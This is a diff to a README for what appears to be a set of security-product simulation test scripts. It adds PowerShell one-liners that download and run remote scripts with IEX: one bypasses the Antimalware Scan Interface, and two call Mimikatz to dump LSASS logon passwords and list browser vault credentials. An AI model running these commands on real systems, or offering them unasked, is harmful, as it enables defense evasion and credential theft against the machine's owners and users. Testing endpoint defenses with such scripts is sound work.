@@ -29,7 +29,13 @@ The scripts can be executed on production envirenmnet.
 
 ## Antimalware Scan Interface (AMSI) 
 
+### 1. AmsiScanBuffer
+`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-AMSI1.ps1"); Invoke-AmsiBypass1;`
+
 ## Credentials Theft
 
 ### 1. Lsass logon passwords
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -DumpCreds;`
+
+### 2. Browser Vault credential theft
+`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "vault::list";`
